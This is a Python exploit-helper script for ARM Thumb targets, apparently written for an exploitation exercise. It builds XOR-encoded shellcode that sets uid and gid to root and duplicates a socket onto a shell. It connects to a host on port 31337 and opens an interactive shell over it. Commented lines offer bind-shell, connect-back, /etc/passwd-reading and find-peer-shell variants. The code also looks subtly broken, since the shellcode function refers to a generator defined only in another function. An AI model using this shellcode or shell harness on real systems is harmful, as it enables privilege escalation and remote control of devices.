#!python

from ARMSCGen import *
from socket import *
import telnetlib
import time
import sys

HOST = 'pi'
PORT = 31337

def makeSocket(host, port):
    """makes a socket for connecting to remote and make a socket as a UNIX file

    Args:
        None

    Returns:
        tuple(s and f):
        s(int): socket descriptor
        
        f(int): file descriptor mapped the socket
    """
    s = socket(AF_INET, SOCK_STREAM)
    s.connect( (host, port) )
    f = s.makefile('rw', bufsize=0)
    return (s,f)

def spawnAShell(s):
    """spawns a shell mapped the socket

    Args:
        s(int): socket descriptor
    """
    tn = telnetlib.Telnet()
    tn.sock = s
    tn.interact()

def getShellcode():
    #xsc = CompileSC(scgen.bindshell(55559, sock=5, once=False), isThumb=True)
    #xsc = CompileSC(scgen.connectback('127.0.0.1', 4444), isThumb=True)
    #sc1 = scgen.open_file('/etc/passwd')
    #sc2 = scgen.sendfile('r6', 4)
    #sc   = scgen.cat(filepath='/etc/passwd', in_fd='r6', out_fd=4)
    #sc   = scgen.findpeersh()
    #sc  += scgen.exit(243)
    #sc   = scgen.ls('/home/', 4)
    #sc    = scgen.write_to_stack(4, 128)
    #sc    += scgen.read_from_stack(4, 128)
    sc =  scgen.setreuid(0)
    sc += scgen.setregid(0)
    sc += scgen.dupsh(4)
    xsc = CompileSC( (sc), isThumb=True)
    #xsc = CompileSC( (sc1+sc2), isThumb=True)
    return MakeXorShellcode(xsc)

def Test():
    """Examples all of shellcodes in Thumb Mode

    """

    scgen  = thumbSCGen()
    sc = getShellcode()

    pass

if __name__ == '__main__':
    Test()
